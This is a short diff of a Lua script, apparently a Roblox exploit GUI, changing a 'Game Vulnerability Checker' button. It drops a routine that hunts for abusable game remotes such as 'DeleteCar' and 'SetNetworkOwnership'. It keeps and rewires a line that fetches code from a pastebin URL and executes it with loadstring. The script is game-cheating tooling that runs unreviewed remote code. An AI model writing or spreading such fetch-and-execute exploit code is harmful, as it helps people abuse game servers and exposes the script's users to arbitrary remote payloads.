@@ -1982,24 +1982,11 @@ local Section = DebuggingTab:AddSection({
 })
 --[] Seperator
 
-function GameVulnChecker()
-    for i, v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
-      if v.Name == "DestroySegway" or v.Name == "DeleteCar" or v.Name == "HandlessSegway" or v.Name == "Building Tools" or v.Name == "SetNetworkOwnership" or v.Name == "ChangeParent" or v.Name == "despawn" then
-		    print("Vuln Found")
-		    loadstring(game:HttpGet("https://pastebin.com/raw/S28p8fN9"))()
-		end
-  end
-end
-
-
 DebuggingTab:AddButton({
 	Name = "Game Vulnerability Checker",
 	Callback = function()
-		GameVulnChecker()
-end
-
-loadstring(game:HttpGet("https://pastebin.com/raw/S28p8fN9"))()
-	end
+		loadstring(game:HttpGet("https://pastebin.com/raw/S28p8fN9"))()
+ end
 })	
 
 DebuggingTab:AddButton({
